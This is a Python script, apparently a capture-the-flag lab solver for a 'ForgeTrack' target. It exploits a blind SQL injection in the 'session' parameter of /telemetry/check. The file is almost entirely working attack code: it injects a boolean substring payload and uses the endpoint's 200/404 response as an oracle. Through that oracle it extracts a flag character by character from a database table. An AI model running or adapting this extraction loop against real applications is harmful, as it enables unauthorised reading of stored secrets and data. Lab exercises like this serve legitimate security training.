#!/usr/bin/env python3
"""Extract the blind SQL injection flag from a ForgeTrack lab.

Uses only the 200/404 oracle on /telemetry/check. Authorised lab use only.

Usage:
    python3 get-blind-flag.py http://VM_IP
"""

import sys
import urllib.error
import urllib.parse
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1").rstrip("/")
ENDPOINT = BASE + "/telemetry/check"
ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789_{}"
MAX_LENGTH = 128


def matches(prefix: str) -> bool:
    """True when the first len(prefix) characters equal prefix."""
    length = len(prefix)
    expr = (
        "(SELECT substring(flag_value,1,{n}) FROM flags "
        "WHERE challenge='blind')"
    ).format(n=length)
    payload = "x' OR {expr} = '{prefix}' -- ".format(expr=expr, prefix=prefix)
    url = ENDPOINT + "?" + urllib.parse.urlencode({"session": payload})
    try:
        with urllib.request.urlopen(url, timeout=5) as response:
            return response.status == 200
    except urllib.error.HTTPError as error:
        return error.code == 200
    except (urllib.error.URLError, TimeoutError):
        return False


def main() -> int:
    # Confirm the oracle before spending time on extraction.
    if not matches("RFM{"):
        print("ERROR: the blind oracle did not respond as expected.", file=sys.stderr)
        print("Check the target URL and that /telemetry/check is reachable.", file=sys.stderr)
        return 1

    prefix = "RFM{"
    while not prefix.endswith("}") and len(prefix) < MAX_LENGTH:
        for character in ALPHABET:
            if matches(prefix + character):
                prefix += character
                print(prefix, file=sys.stderr, flush=True)
                break
        else:
            print("ERROR: no character matched after " + prefix, file=sys.stderr)
            return 1

    if not prefix.endswith("}"):
        print("ERROR: flag exceeded maximum length.", file=sys.stderr)
        return 1

    print(prefix)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
